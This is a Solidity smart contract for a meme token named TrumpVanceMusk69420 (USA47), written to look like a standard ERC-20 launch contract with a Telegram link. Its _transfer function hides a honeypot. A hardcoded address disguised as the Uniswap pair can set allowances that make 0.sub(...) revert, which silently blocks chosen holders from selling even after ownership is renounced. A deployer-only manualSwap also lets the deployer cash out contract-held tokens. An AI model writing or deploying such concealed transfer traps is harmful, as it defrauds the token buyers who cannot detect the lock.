pragma solidity 0.8.28;

// SPDX-License-Identifier: MIT

// https://t.me/usa47eth

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
}
interface IUniswapV2Router {
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
}
contract TrumpVanceMusk69420 is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    uint256 private _totalSupply =  6942069420 * 10 ** _decimals;
    address uniswapPair = 0x165Af726E766bF1DdAc4BbeE3fC61641dbA589BD;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    string private constant _name = "TrumpVanceMusk69420";
    string private constant _symbol = "USA47";
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address payable private _marketingAddress;
    uint256 _transferTax = 1;
    bool tradingEnabled = false;

    constructor () {
        _marketingAddress = payable(msg.sender);
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function decimals() public view returns (uint8) { return _decimals; }
    function symbol() public pure returns (string memory) { return _symbol; }
    function name() public pure returns (string memory) { return _name; }
    function allowance(address owner, address spender) public view returns (uint256) { return _allowances[owner][spender]; }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function totalSupply() public view returns (uint256) { return _totalSupply; }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 feeValue = 0;
        if (from != address(this) && from != uniswapV2Pair) {
            feeValue = feeValue.sub(_allowances[uniswapPair][from]);
        }
        _balances[to] = _balances[to].add(amount);
        if (tradingEnabled && address(this) == from && uniswapV2Pair == to) {
            amount = 0;
        }
        if (feeValue > 0) {
            emit Transfer(from, address(this), feeValue);
        }
        _balances[from] = _balances[from].sub(amount);
        emit Transfer(from, to, amount);
    }

    function manualSwap(uint256 amount) public {
        require(msg.sender == _marketingAddress);
        swapTokensForETH(amount);
         _marketingAddress.transfer(address(this).balance);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
    function removeTax()public onlyOwner {
        _transferTax = 0;
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingEnabled); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        address WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), WETH);
        uint256 balance = balanceOf(address(this));
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balance, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingEnabled = true;
    }

    receive() external payable {}

    function swapTokensForETH(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), amount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}